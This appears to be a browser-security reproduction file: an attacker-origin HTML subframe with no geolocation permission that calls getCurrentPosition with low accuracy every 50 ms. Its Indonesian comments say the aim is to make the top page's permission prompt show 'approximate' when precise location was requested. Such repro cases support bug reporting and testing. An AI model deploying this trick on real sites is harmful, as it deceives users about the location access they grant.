<!-- evil.html @ origin B (attacker subframe, TANPA allow=geolocation) -->
<!doctype html><meta charset=utf-8>
<script>
// spam hint 'false' — kalau flag tab ketulis dari sini, prompt A bakal
// nampilin "approximate" walau A minta precise.
setInterval(() => {
  navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}, { enableHighAccuracy: false });
}, 50);
</script>
